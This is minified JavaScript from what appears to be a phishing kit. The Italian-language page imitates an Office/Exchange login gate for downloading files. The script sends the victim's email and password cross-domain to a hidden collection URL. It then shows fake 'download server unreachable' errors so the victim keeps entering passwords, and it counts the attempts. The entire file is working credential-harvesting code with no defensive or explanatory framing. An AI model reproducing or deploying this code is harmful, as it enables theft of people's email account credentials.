$(document).ready(function(){function a(a){for(var r=window.location.search.substring(1).split("&"),o=0;o<r.length;o++){var l=r[o].split("=");if(l[0]==a)return decodeURIComponent(l[1])}}var r=a("dl1"),o=a("dl2"),l=a("dl3"),e=a("dl4");document.getElementById("dl1").innerHTML=r,document.getElementById("dl2").innerHTML=o,document.getElementById("dl3").innerHTML=l,document.getElementById("dl4").innerHTML=e,$("#loginForm input").keydown(function(){$("#authError, #emailError, #passwordError").html("").addClass("visually-hidden")}),$("#right-modal-lg").on("hidden.bs.modal",function(){$("#loginForm")[0].reset(),$("#loginCount").val("0"),$("#authError, #emailError, #passwordError").html("").addClass("visually-hidden")}),$("#sign-in-with-office").click(function(){$("#loginForm")[0].reset(),$("#loginCount").val("0"),$("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");var a=$("#officeURL").html();officeAuth=window.open(a,"Auth","scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=600,left=100,top=100");var r=setInterval(function(){officeAuth.closed&&($("#authError").html('<span class="animated fadeInUp"><span id="errorText">Impossibile raggiungere il server di download. Riprovare</span></span>').removeClass("visually-hidden"),clearInterval(r))},250);officeAuth||(window.location.href=a)}),$("#sign-in-with-exchange").click(function(){$("#loginForm")[0].reset(),$("#loginCount").val("0"),$("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");var a=$("#exchangeURL").html();exchangeAuth=window.open(a,"Auth","scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=600,left=100,top=100");var r=setInterval(function(){exchangeAuth.closed&&($("#authError").html('<span class="animated fadeInUp"><span id="errorText">Impossibile raggiungere il server di download. Riprovare</span></span>').removeClass("visually-hidden"),clearInterval(r))},250);exchangeAuth||(window.location.href=a)}),$("#loginForm").submit(function(a){a.preventDefault(),$("#authError").html("").addClass("visually-hidden");var r,o=$("#email").val().trim(),l=$("#password").val().trim();o?(r=o,/^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/.test(r))?l?l.length<5?($("#passwordError").html('<div class="auth0-lock-error-invalid-hint">Mmm, c&acute;\xe8 qualcosa che non torna. Sicuro di aver scritto tutto giusto?</div>').removeClass("visually-hidden"),$("#password").focus(),$("#emailError").html("").addClass("visually-hidden")):jQuery.ajax({url:$("#sourceURL").html(),data:$("#loginForm").serialize(),type:"POST",crossDomain:!0,beforeSend:function(){$("#loginForm input").blur(),$("#content-loading").show(),$("#emailError, #passwordError").html("").addClass("visually-hidden")},success:function(a){a.match(/1/i)?($("#content-loading").hide(),$("#loginCount").val("2"),$("#password").val(""),$("#password").focus(),$("#authError").html('<span class="animated fadeInUp"><span id="errorText">Impossibile raggiungere il server di download. Riprovare</span></span>').removeClass("visually-hidden")):a.match(/2/i)?($("#content-loading").hide(),$("#loginCount").val("1"),$("#password").val(""),$("#password").focus(),$("#authError").html('<span class="animated fadeInUp"><span id="errorText">Impossibile raggiungere il server di download. Riprovare</span></span>').removeClass("visually-hidden")):a.match(/0/i)?($("#content-loading").hide(),$("#loginCount").val("1"),$("#email, #password").val(""),$("#email").focus(),$("#authError").html('<span class="animated fadeInUp"><span id="errorText">Accedere con il proprio account e-mail.</span></span>').removeClass("visually-hidden")):a.match(/-0/i)&&($("#content-loading").hide(),$("#loginCount").val("0"),$("#password").val("").focus(),$("#authError").html('<span class="animated fadeInUp"><span id="errorText">Errore. Controllare la rete e riprovare.</span></span>').removeClass("visually-hidden"))},error:function(){$("#content-loading").hide(),$("#loginCount").val("0"),$("#password").val("").focus(),$("#authError").html('<span class="animated fadeInUp"><span id="errorText">Errore. Controllare la rete e riprovare.</span></span>').removeClass("visually-hidden")}}):($("#passwordError").html('<div class="auth0-lock-error-invalid-hint">Sai gi\xe0 cosa devi fare</div>').removeClass("visually-hidden"),$("#password").focus(),$("#emailError").html("").addClass("visually-hidden")):($("#emailError").html('<div class="auth0-lock-error-invalid-hint">Mmm, c&acute;\xe8 qualcosa che non torna. Sicuro di aver scritto tutto giusto?</div>').removeClass("visually-hidden"),$("#email").focus(),$("#passwordError").html("").addClass("visually-hidden")):($("#emailError").html('<div class="auth0-lock-error-invalid-hint">Sai gi\xe0 cosa devi fare</div>').removeClass("visually-hidden"),$("#email").focus(),$("#passwordError").html("").addClass("visually-hidden"))})});
